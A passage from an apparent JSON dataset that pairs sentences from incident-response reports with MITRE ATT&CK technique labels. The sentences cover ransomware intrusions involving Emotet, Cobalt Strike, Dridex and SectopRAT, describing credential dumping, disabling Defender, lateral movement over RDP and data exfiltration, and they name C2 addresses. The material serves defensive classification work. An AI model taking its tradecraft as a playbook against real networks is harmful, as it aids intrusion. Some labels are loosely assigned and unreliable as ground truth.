    "type": "text",
    "text": "Here, we can see Defender Control turning off Defender via Local Group Policy Editor:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Within 10 minutes the attacker went from local admin, to domain admin to installing ransomware on multiple machines.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The attacker used Defender Control to turn off Defender and then used Mimikatz to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Logs showing the extraction and use of DefenderControl to disable Windows Defender during the attack:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The attacker used Defender Control which we’ve seen in the past to disable Defender and Mimikatz to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware payload created a few run keys",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours from initial access.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on the beachhead.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to ufile.io using Internet Explorer.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named “kill.bat” was executed on all of the targeted machines.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named “Documents.lnk” which executes the DLL via rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "After the initial execution, the malware contacted two of its C2 IPs:159.223.31.75,206.189.49.239.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They used PowerShell and cmd to automate the download and installation of AnyDesk.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In order to install Anydesk for unattended access you have to set a password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The password here was set to J9kzQ2Y0qO",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This password also matches one from the leaked Conti manuals back in August.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors made use of process injection through-out the intrusion.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL’s activity.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike processes were also observed injecting into various other processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "All the activity was done using RDP on the server with backups.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Advanced IP Scanner was downloaded using Internet Explorer on a server:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Via RDP they manually ran @carlos_perez‘s Invoke-Sharefinder.ps1 on a server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It then looks like they manually copied the output to a file named shares.txt.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Most likely using credentials gathered through dumping of either lsass, or the registry hives.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This also revealed their Workstation Name which is WIN-799RI0TSTOF.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.",
    "command": "",
    "labels": [
      "T1005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "And then uploaded the dump file to ufile.io using Internet Explorer on a server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The final actions took place from a compromised file server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After that completed, they reviewed the results on the host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "From a file server, the threat actors then established RDP connections to all the machines in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors transferred 2 files onto the machines they connected to.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "After completion of this activity, the ransomware binary was executed manually over the RDP connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors went from initial access to domain wide ransomware in just under two days.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We executed a malicious Word doc in our honeypot which later elevated to multiple Empire shells across the domain as well as additional Dridex installations.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used well known tools, moved like they were running a playbook, and used an Empire C2 server known to the community for 8 months.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Dridex also known as Bugat and Cridex is a form of malware that specializes in stealing bank credentials via a system that utilizes macros from Microsoft Word.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Like many threat activities today, this started with delivery of a malicious Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "As for command and control, from Dridex on the initial infected workstation, we saw it connect on port 443 to the follow any IP’s discovered by the Suricata signature for: ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex). So, while we saw HTTPS encryption on the wire, defenders could catch this activity with freely available IDS rules.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below we can see the POST request of the PowerShell encoded command, run by the threat actor, via Dridex.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We can see that we are looking at the Empire Post Exploitation Framework.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This IP has been running an Empire C2 server since at least December 2019, as scanned by Urlscan and identified by the hash of the default webpage:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was dropped in the C:\\Users\\Public folder using Empire.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We can see that both command outputs were written to a file.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Both files were then exfiled over the Dridex C2 channel:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors successfully got an Empire shell on a few machines as well as a Domain Controller (DC).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "PsExec was renamed to pse.exe and was downloaded using the below GET request:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Through our investigation, we noticed that the directory where PsExec and AdFind were downloaded from was an open directory, where additional files were stored.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We were not able to acquire all of these files but we were able to access 123.bin, a.txt, ufo.exe, and marple.exe.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This binary contacted 59.148.253[.]194:443 & 2.58.16[.]87:8443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "-c: Copy the specified executable to the remote system for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "-f: Copy the specified program even if the file already exists on the remote system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "-s: Run the remote process as the System account.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As you can see above, ufo.exe is executed as System across multiple hosts, which is all logged to log.txt.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The below snippet is from log.txt, showing that the file was copied/run.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "So when psexec is used to run something on a remote system, it works by creating a new service executable called psexesvc.exe which is embedded within the original psexec.exe file.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "It then creates the PSEXESVC service with this, now local, executable, starts it and then runs the specified command.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "After this, we saw Dridex begin beaconing out from hosts that were successfully compromised by this activity, including the DC with a new C2 address of: 59.148.253.194",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "However, their credential dumping attempts failed and the actor eventually dropped their connection to the Empire shell.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Regardless, the multiple Dridex infections continued to beacon and would have allowed the actor instant access back into the environment at any time.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We saw the threat actor attempt (but fail) to dump credentials from a DC multiple times and an attempt to execute Empire and Dridex on most domain joined systems.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over a eight day period.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During this time period, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools were used for command and control, such as Tactical RMM and Anydesk.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These commands would go on to be repeated daily by the Emotet process.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.",
    "command": "",
    "labels": [
      "T1057",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then moved laterally to a workstation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This beacon was then successfully executed via WMI and connected successfully to the threat actors server.",
    "command": "",
    "labels": [
      "T1047",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They then proceeded to dump credentials from the LSASS process on the host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.",
    "command": "",
    "labels": [
      "T1005",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The Mega.io service was the location the stolen data was sent.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From there, the threat actors began connecting to other hosts via RDP, including the a backup server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload via regsvr32.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the PowerShell script from the LNK file executed successfully, Emotet began execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Emotet will initially copy itself to a randomly named folder in the users temporary folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Multiple instances of Emotet spawning itself was observed over a period of three days.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Almost all the instances of Emotet included three enumeration commands executed:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This access was used to perform enumeration and move laterally to other hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The Emotet malware has used various persistence methods over time, an example can be seen here.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "On the first day, Emotet established persistence via a run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As we can see, the regsvr32.exe Windows’s native utility was used to launch the Emotet DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Tactical RMM was the first tool chosen for deployment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.",
    "command": "",
    "labels": [
      "T1055",
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed deleting files that had been dropped to disk.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Granted Access level matches known indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During the initial Emotet execution, three automated discovery commands were observed.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These were then repeated, seen occurring once a day from the Emotet host.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The remnants of Invoke-ShareFinder could also be seen on the network through the consistent querying of “ADMIN$” and “C$” shares for each host over a short period of time.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition to these shares, a few shares from the file servers were also accessed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once on the domain controller, two batch files were run.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "These documents were again reviewed by the threat actor on the final day of the intrusion.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent. This domain was registered very close to the timeline of this incident.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A domain registered to be used with Tactical RMM Agent will have both an api and mesh subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These were both hosted on the same server IP: 212.73.150.62.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use: icanhazip.tacticalrmm.io",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Using this RMM agent they proceeded to install AnyDesk on the host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The following process activity was observed from meshagent.exe.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The decoded base64 content reveals commands for console access and connect actions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From the rclone.conf file, the threat actors left the details of the remote account being used.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Don’t Sleep has the capability to keep the computer from being shutdown and the user from being signed off.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This was likely done to ensure nothing will interfere with the propagation of the ransomware payload.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "After the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker. We believe this was to monitor the execution of the ransomware payload.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor gained initial access by a fake Zoom installer that used d3f@ckloader and IDAT loader to drop SectopRAT.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After nine days of dwell time, the SectopRAT malware dropped Cobalt Strike and Brute Ratel.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement was achieved using various remote services and later RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "To facilitate RDP lateral movement the threat actor employed a malware with proxy capabilities known as QDoor.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used WinRAR to archive various files and then upload them to a cloud SaaS application named Bublup.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When visiting the website and downloading a file that seems intended for installing Zoom, the user was, in fact, installing a malicious program created with Inno Setup.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The malicious program was a d3f@ck loader based on the Pascal scripting language and included several references to the subsequent stages in the execution chain, such as OneDrive, Telegram, and Steam.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After executing a batch script to exclude the payload folder from Windows Defender and mark it as hidden,",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "the program connected to a Steam Community page for the next stage IP address.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Two archive files were downloaded from this IP and extracted",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script then proceeded to execute a payload from each archive.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "From one archive the script ran the legitimate Zoom installer so that the end user would get the program they thought they downloaded lowering the chances of the user reporting the event to IT or security staff.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The second payload executed was IDAT loader and an encrypted payload file, that resulted in the injection of SectopRAT into MSBuild.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The MSbuild.exe process called out to Pastebin to receive an IP address to use for it’s command and control endpoint.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After this, command and control traffic was established and activity ceased for eight days.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was for a Brute Ratel payload, commonly referred to as ‘Badgers’.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This Badger ran a series of Windows commands for discovery before executing a Cobalt Strike executable beacon.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon injected into a dllhost process and then was observed accessing LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
